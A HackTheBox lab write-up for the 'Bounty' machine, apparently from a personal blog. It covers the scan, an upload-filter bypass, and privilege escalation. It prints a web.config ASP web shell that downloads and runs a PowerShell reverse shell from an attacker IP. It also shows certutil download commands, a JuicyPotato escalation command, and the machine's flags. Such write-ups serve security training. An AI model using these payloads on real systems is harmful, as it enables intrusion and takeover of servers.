+++
title = "HTB - Bounty"
date = 2024-12-01
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.93 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 12:38 EST
Nmap scan report for 10.10.10.93
Host is up (0.088s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.05 seconds
```

### Enumeration
All we get is a webpage running IIS 7.5. When directory busting, make sure to include relevant file-types for the software (aspx!)
We can `locate` a `.aspx` shell of choice, but when we try and upload, we are met with an invalid file error.
We can use Burp intruder to bruteforce responses, and find that `.config` files are accepted.
Looking up `aspx` configuration web shell, we understand that we need to append our shell to a valid config file:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
	call Server.CreateObject("WScript.shell").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10:8000/Invoke-PowerShellTcp.ps1')")
%>
-->
```
We can edit our webshell to call back directly to our reverse shell. Copy nishang's invoke powershell to the working directory and append with `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443`. Then, edit the call in the webshell to download our shell from a python instance. So first, edit web.config. Then, serve with instance, then start revshell listener, then upload the webconfig to the server. Target will download shell from python, act on it, and connect back to us on our listener.

one shell is gotten, make and go to temp dir. move juicypot with certutil: 
`certutil -urlcache -f http://10.10.14.10:8000/JuicyPotato.exe jp.exe`

Now, we need to make a .bat file to call back for another shell with increased privileges. On Kali, first update the nishang shell to represent our new listener:
`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 9001`
Then,
`echo "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10:8000/Invoke-PowerShellTcp.ps1')" > rev.bat`

Now we need to transfer this file to the machine:
`certutil -urlcache -f http://10.10.14.10:8000/rev.bat rev.bat`

Now that we've got what we need, run jp and use the default CLSID for Windows Server 2008 R2 Enterprise. These values can be found here https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2008_R2_Enterprise/README.md. Make sure everything you need to work with is in temp dir. Start your listener on 9001
`.\jp.exe -l 9001 -p rev.bat -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"`

Shell attained.
`gci -force` for hidden user flag.
USER:`4ecce6fee2f84602e837a00f52fd63f5`
ROOT:`8b9de2987814ff19db16adc9f2fa7afd`
